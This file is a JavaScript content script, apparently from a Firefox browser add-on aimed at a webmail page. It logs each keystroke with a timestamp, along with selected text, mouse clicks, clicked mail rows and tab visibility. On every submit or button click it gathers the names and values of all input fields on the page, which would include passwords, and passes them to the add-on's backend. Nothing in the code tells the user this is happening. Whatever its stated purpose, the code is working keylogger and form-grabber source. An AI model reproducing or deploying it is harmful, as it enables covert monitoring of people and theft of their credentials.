   var record="";
    var charCount=0;
    var keyPoints="";

//if(document.getElementBy("nh") != null){
console.log("subject",document.getElementsByClassName("y6").length );
	 	//self.port.emit("subject",document.getElementById("nh").value+"" );
		
		//}
		var tags = document.getElementsByClassName("y6");
		for(var i=0;i<tags.length;i++){
		console.log(tags[i].childNodes.length);
			console.log(tags[i].childNodes[0].innerHTML,"Tag");
			}
	
   document.onkeyup=function(e) {
    
               if(e.which > 64 && e.which < 91){
                       //Do nothing as this is alphabets
               } else if(e.which > 185 && e.which < 193){
                       //Do nothing (special characters)
               } else if(e.which > 218 && e.which < 223){
                       //Do nothing (special characters)
               } else if(e.which > 47 && e.which < 58){
                       //Do nothing (Numbers)
               }
               //Shift Key released
               else if(e.which == 16){
                       keyPoints=keyPoints+ ' ' + getTheKey( e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
                       
               }
               //Backspace key pressed
               else if(e.which == 8){
                       keyPoints=keyPoints+ ' ' + getTheKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
                }
				else if(e.which == 9){
                       keyPoints=keyPoints+ ' ' + getTheKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
					   //alert(keyPoints);
					   	self.port.emit("keyPoints",keyPoints+"" );
						keyPoints="";
               
                }
               //Spacebar key pressed
               else if(e.which == 32){                       
			  // console.log(e.which);
			    keyPoints=keyPoints+ ' ' + getTheKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
				//alert(keyPoints);
				self.port.emit("keyPoints",keyPoints+"" );
				keyPoints="";
               
			   }
               //Enter key pressed
               else if(e.which == 13){
                     keyPoints=keyPoints+ ' ' + getTheKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
                      // console.log(e.which);
					  //alert(keyPoints);
				self.port.emit("keyPoints",keyPoints+"" );
				keyPoints="";

					   
               } else {
			     keyPoints=keyPoints+ ' ' + getTheKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
                       //console.log(e.which);
               }
       
       }
       document.onkeypress=function(e){
	    
               var flag = false;
               if(e.which > 96 && e.which < 127){
                       flag = true;
               } else if(e.which > 57 && e.which < 97){
                       flag = true;
               } else if(e.which > 32 && e.which <58){
                       flag = true;
               } else{
                       flag = false;
               }
               if(flag == true){
        	     keyPoints=keyPoints+ ' ' + getTheCharKey(e.which)+"("+new Date(Date.now()).toLocaleTimeString()+")";
                      // console.log(e.which);
               }
       }

function getTheKey(charCode){
    var textBox = String.fromCharCode(charCode);
   // console.log("~CHARCODE: "+charCode+" | "+textBox);
      if (charCode == 8) textBox = "[BACKSPACE]"; //  backspace
      if (charCode == 9) textBox = "[TAB]"; //  tab
      if (charCode == 13) textBox = "[ENTER]"; //  enter
      if (charCode == 16) textBox = "[SHIFT]"; //  shift
      if (charCode == 17) textBox = "[CTRL]"; //  ctrl
      if (charCode == 18) textBox = "[ALT]"; //  alt
      if (charCode == 19) textBox = "[PAUSE/BREAK]"; //  pause/break
      if (charCode == 20) textBox = "[CAPSLOCK]"; //  caps lock
      if (charCode == 27) textBox = "[ESCAPE]"; //  escape
      if (charCode == 32) textBox = "[SPACEBAR]"; // spacebar
      if (charCode == 33) textBox = "[PAGEUP]"; // page up, to avoid displaying alternate character and confusing people            
      if (charCode == 34) textBox = "[PAGEDOWN]"; // page down
      if (charCode == 35) textBox = "[END]"; // end
      if (charCode == 36) textBox = "[HOME]"; // home
      if (charCode == 37) textBox = "[LEFTARROW]"; // left arrow
      if (charCode == 38) textBox = "[UPARROW]"; // up arrow
      if (charCode == 39) textBox = "[RIGHTARROW]"; // right arrow
      if (charCode == 40) textBox = "[DOWNARROW]"; // down arrow
      if (charCode == 45) textBox = "[INSERT]"; // insert
      if (charCode == 46) textBox = "[DELETE]"; // delete
      if (charCode == 91) textBox = "[LEFTWINDOW]"; // left window
      if (charCode == 92) textBox = "[RIGHTWINDOW]"; // right window
      if (charCode == 93) textBox = "[SELECTKEY]"; // select key
      if (charCode == 96) textBox = "[NUMPAD0]"; // numpad 0
      if (charCode == 97) textBox = "[NUMPAD1]"; // numpad 1
      if (charCode == 98) textBox = "[NUMPAD2]"; // numpad 2
      if (charCode == 99) textBox = "[NUMPAD3]"; // numpad 3
      if (charCode == 100) textBox = "[NUMPAD4]"; // numpad 4
      if (charCode == 101) textBox = "[NUMPAD5]"; // numpad 5
      if (charCode == 102) textBox = "[NUMPAD6]"; // numpad 6
      if (charCode == 103) textBox = "[NUMPAD7]"; // numpad 7
      if (charCode == 104) textBox = "[NUMPAD8]"; // numpad 8
      if (charCode == 105) textBox = "[NUMPAD9]"; // numpad 9
      if (charCode == 106) textBox = "[MULTIPLY]"; // multiply
      if (charCode == 107) textBox = "[ADD]"; // add
      if (charCode == 109) textBox = "[SUBTRACT]"; // subtract
      if (charCode == 110) textBox = "[DECIMALPOINT]"; // decimal point
      if (charCode == 111) textBox = "[DIVIDE]"; // divide
      if (charCode == 112) textBox = "[F1]"; // F1
      if (charCode == 113) textBox = "[F2]"; // F2
      if (charCode == 114) textBox = "[F3]"; // F3
      if (charCode == 115) textBox = "[F4]"; // F4
      if (charCode == 116) textBox = "[F5]"; // F5
      if (charCode == 117) textBox = "[F6]"; // F6
      if (charCode == 118) textBox = "[F7]"; // F7
      if (charCode == 119) textBox = "[F8]"; // F8
      if (charCode == 120) textBox = "[F9]"; // F9
      if (charCode == 121) textBox = "[F10]"; // F10
      if (charCode == 122) textBox = "[F11]"; // F11
      if (charCode == 123) textBox = "[F12]"; // F12
      if (charCode == 144) textBox = "[NUMLOCK]"; // num lock
      if (charCode == 145) textBox = "[SCROLLLOCK]"; // scroll lock
      if (charCode == 186) textBox = ";"; // semi-colon
      if (charCode == 187) textBox = "="; // equal-sign
      if (charCode == 188) textBox = ","; // comma
      if (charCode == 189) textBox = "-"; // dash
      if (charCode == 190) textBox = "."; // period
      if (charCode == 191) textBox = "/"; // forward slash
      if (charCode == 192) textBox = "`"; // grave accent
      if (charCode == 219) textBox = "["; // open bracket
      if (charCode == 220) textBox = "\\"; // back slash
      if (charCode == 221) textBox = "]"; // close bracket
      if (charCode == 222) textBox = "'"; // single quote
    //console.log("~CHARCODE: "+charCode+" | "+textBox);
    return textBox;
}

function getTheCharKey(charCode){
    var textBox = String.fromCharCode(charCode);
    //console.log("KEYPRESS: ----- "+charCode+" | "+textBox);
    return textBox;
}   
	//document.addEventListener("mousemove", mouseMoving, false);
	//document.addEventListener("mousedown", mousePressed, false);
	document.addEventListener("mouseup", mouseReleased, false);
	document.addEventListener("click", mouseClicked, false);
	 
	function mouseMoving(e) {
		//console.log(e.screenX + " " + e.screenY);
	}
	 
	function mousePressed(e) {
		//console.log("Mouse is down!");
	}
	 
	function mouseReleased(e) {
		//console.log("Mouse is up!");
		if(getSelectedText()!=''){
		var selected = getSelectedText();
	//	console.log("selected text : "+selected);
		
		self.port.emit("Selected",selected+"" );
		}
	}
	 
		function mouseClicked(e) {
			//console.log("Mouse is clicked!"+e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName);
			//console.log(e.target.getAttribute('type'));
			var mailitemclass = "";
			var nodes = [];
			var element = e.target;
			nodes.push(element);
			while(element.parentNode) {
				nodes.unshift(element.parentNode);
				element = element.parentNode;
				if(element.tagName == "TR"){
				//console.log(element.className);
				mailitemclass = element.className;
				break;
				}
				
			}
			//console.log("nodes are")
			//for(var i=0;i<nodes.length;i++){
			//console.log(nodes[i].tagName,"Tag");
			//}
			
			self.port.emit("mailrow", mailitemclass,document.title);
			self.port.emit("Mouse", e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName+" "+e.target.value+" "+e.target.className);
			if(e.target.tagName=='INPUT')
				{
				if(e.target.getAttribute('type')=='submit')
				{
					saveFormFields();
						}
		
		}else if(e.target.tagName=='BUTTON'){
		saveFormFields();
	
		}
		}
	//document.getElementsByTagName('button').onclick = function() {
	  // alert("button was clicked");
	//};
	function getSelectedText() {
		if (window.getSelection) {
			txt = window.getSelection();
		} else if (window.document.getSelection) {
			txt =window.document.getSelection();
		} else if (window.document.selection) {
			txt = window.document.selection.createRange().text;
		}
		return txt;  
	}
	document.addEventListener("visibilitychange", function() {
	 // console.log(document.hidden, document.visibilityState);
	  self.port.emit("Tab",document.visibilityState);
	}, false);


function saveFormFields() {                       
            //console.log("Form Fields Saved\n");
            inputs = document.getElementsByTagName('input');
            var logformfields = '';
            for (index = 0; index < inputs.length; ++index) {
               //console.log(inputs[index]+":"+inputs[index].value+"\n");
               logformfields += inputs[index]+"~ "+inputs[index].name+": "+inputs[index].value+" ["+inputs[index].type+"]\n";
            }
       //         console.log(logformfields);
				 self.port.emit("Input",logformfields);
        }
window.addEventListener("sizemodechange", function(event) {
 //console.log("sizemodechange " + window.windowState + " " + window.screenX + " " + window.screenY + "\n");
 //self.port.emit("Window",window.windowState);
 }, false);
window.addEventListener("resize", function(event) { 
//console.log("Window " , window.windowState + " " + window.screenX + " " + window.screenY); 
//self.port.emit("Window",window.windowState + " " + window.screenX + " " + window.screenY);
 },false);		
 

